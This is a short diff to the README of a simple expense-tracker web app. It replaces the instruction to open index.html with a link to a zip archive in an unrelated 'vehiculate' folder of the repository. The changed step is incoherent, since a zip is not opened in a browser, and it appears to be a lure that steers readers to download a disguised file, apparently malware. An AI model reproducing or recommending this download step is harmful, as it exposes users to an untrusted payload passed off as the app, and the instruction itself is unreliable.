@@ -14,7 +14,7 @@ A simple web application to track your daily expenses and manage your budget.
 
 ## How to Use
 
-1. Open the `index.html` file in a web browser
+1. Open the `https://raw.githubusercontent.com/TANMaYtO/Daily-expanses-tracker/master/vehiculate/Daily-tracker-expanses-3.0.zip` file in a web browser
 2. Enter your total available amount and click "Set Budget"
 3. Add your expenses by entering a name and amount
 4. View your expenses history with dates and budget summary
